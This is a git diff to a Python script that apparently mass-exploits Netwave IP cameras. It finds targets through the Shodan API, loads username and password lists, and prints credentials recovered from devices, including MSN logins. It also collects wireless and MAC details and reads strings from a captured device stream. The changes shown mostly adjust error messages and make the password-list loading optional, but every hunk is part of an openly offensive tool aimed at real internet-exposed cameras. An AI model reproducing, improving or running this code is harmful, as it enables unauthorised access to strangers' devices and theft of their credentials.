@@ -103,13 +103,18 @@ def main() :
    api = shodanapi.search(args.search, limit = args.limit, offset = args.offset)
    total = api.get('total')
 
-   usernames = args.username.readlines()
-   passwords = args.password.readlines()
-   
    print(backgroundColor.OKGREEN + "[+] Shodan successfully Connected."+ backgroundColor.ENDC)
    print(backgroundColor.OKGREEN + "[+] Netwave Exploit Enabled."+ backgroundColor.ENDC)
    print(backgroundColor.OKGREEN + "[+] Netwave IP Camera Found: %d" % (total) + backgroundColor.ENDC)
-   print(backgroundColor.OKGREEN + "[+] Passwords loaded: %d" % (len(passwords)) + backgroundColor.ENDC)
+
+   if args.username or args.password :
+      usernames = args.username.readlines()
+      passwords = args.password.readlines()
+
+      print(backgroundColor.OKGREEN + "[+] Passwords loaded: %d" % (len(passwords)) + backgroundColor.ENDC)
+      pass
+   
+  
 
    ShodanModuleExploit = raw_input(backgroundColor.WARNING + "[!] Disable password discovery module? (Yes/no): " + backgroundColor.ENDC)
 
@@ -212,7 +217,7 @@ def main() :
                  if not(msn_user == '') :
                      print( backgroundColor.OKGREEN + "[+] MSN: %s@%s" % (msn_user, msn_pwd) + backgroundColor.ENDC)
          except Exception as e:
-             print("Error")
+             print(backgroundColor.FAIL + "[-] %s not found " % url + backgroundColor.ENDC)
          break
         else:
          found = False
@@ -228,7 +233,7 @@ def main() :
         exploit = True
         print(backgroundColor.FAIL + backgroundColor.BOLD + "[!] Password not found" + backgroundColor.ENDC)
      except Exception as e:
-      print(backgroundColor.FAIL + "[!] Error" + backgroundColor.ENDC)
+      print(backgroundColor.FAIL + "[-] %s not found" % url + backgroundColor.ENDC)
 
      print(backgroundColor.WARNING + "[!] Getting System Information" + backgroundColor.ENDC)
      print(backgroundColor.WARNING + "[!] Getting Wireless System Information" +backgroundColor.ENDC)
@@ -253,7 +258,7 @@ def main() :
       else:
         print(backgroundColor.FAIL + "[-] Getting mac address" + backgroundColor.ENDC)
      except Exception as e:
-      print(backgroundColor.FAIL + "[!] Error" + backgroundColor.ENDC)
+      print(backgroundColor.FAIL + "[-] %s not found" %  wireless + backgroundColor.ENDC)
 
      print("""[+] Host: http://%s:%s\n[+] Country: %s\n[+] City: %s\n[+] Organization: %s\n[+] Product: %s""" % (host, port, country, city, org, product))
 
@@ -293,7 +298,7 @@ def main() :
        os.system('echo "" > tmpstrings.out')
        time.sleep(1)
        proc2 = subprocess.Popen("tail -f tmpstream.txt | strings >>tmpstrings.out", shell=True, preexec_fn=os.setsid)
-       print (backgroundColor.BOLD+"[+] CTRL+C to exit.."+backgroundColor.ENDC)
+       print (backgroundColor.BOLD+"[+] CTRL+C to exit.."+ backgroundColor.ENDC)
 
        while 1:
           sys.stdout.flush()
